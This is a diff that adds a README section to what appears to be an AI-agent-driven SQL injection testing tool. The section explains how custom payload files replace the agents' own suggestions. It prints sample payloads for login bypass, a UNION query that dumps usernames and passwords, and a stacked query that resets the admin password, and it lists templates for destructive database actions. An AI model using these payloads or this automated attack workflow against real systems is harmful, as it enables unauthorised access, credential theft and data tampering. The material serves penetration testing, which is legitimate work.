@@ -314,3 +314,74 @@ python test_dict_selector_fix.py --url [TARGET_URL] --visible
 ```
 
 This test intentionally passes a dictionary as a selector, which would have caused the error before the fix, but now successfully runs using auto-detection.
+
+## Custom Payloads Cheatsheet
+
+You can override the SQL Payload Engineer's suggestions with your own custom payloads using the `custom_payloads.yaml` file.
+
+### Usage
+
+1. Edit the `custom_payloads.yaml` file in the project root directory to include your desired SQL injection payloads
+2. The SQL Injection Execution Expert will use your custom payloads instead of the Payload Engineer's suggestions
+3. Leave the file empty or clear it to use the Payload Engineer's suggestions again
+
+### Important Features
+
+- **Exact payload usage**: Payloads are used exactly as written with no modifications
+- **No "123" appended**: Password fields receive the exact payload specified (no additional characters added)
+- **Form field auto-detection**: Works with the automatic form field detection system
+- **Multiple payload testing**: Will try each payload in sequence until one succeeds
+
+### Example custom_payloads.yaml
+
+```yaml
+# Custom SQL Injection Payloads
+payloads:
+  # Authentication bypass payloads
+  - "' OR '1'='1"
+  - "admin' --"
+  
+  # Data extraction payloads
+  - "' UNION SELECT username, password FROM users --"
+  
+  # Database manipulation
+  - "'; UPDATE users SET password='hacked' WHERE username='admin'; --"
+```
+
+### Managing Custom Payloads
+
+Use the `load_custom_payloads.py` script to manage your custom payloads:
+
+```bash
+# View currently loaded custom payloads
+python load_custom_payloads.py
+
+# Clear custom payloads (to use Payload Engineer's suggestions)
+python load_custom_payloads.py --clear
+
+# Use a different payloads file
+python load_custom_payloads.py --file my_payloads.yaml
+```
+
+### Payload Templates
+
+Ready-to-use templates are available in the `custom_payloads_templates` directory:
+
+```bash
+# Copy a template to use it
+cp custom_payloads_templates/auth_bypass.yaml custom_payloads.yaml
+```
+
+Available templates:
+- `auth_bypass.yaml`: Authentication bypass payloads
+- `data_extraction.yaml`: Data extraction payloads 
+- `blind_injection.yaml`: Blind SQL injection techniques
+- `dangerous_actions.yaml`: Database manipulation payloads (use with caution)
+
+### Benefits
+
+- Test specific payloads against a target
+- Focus on certain attack types (authentication bypass, data extraction, etc.)
+- Override the AI's choices with your expert knowledge
+- Quickly iterate through known working payloads
+- Ensure payloads are used exactly as written with no modifications
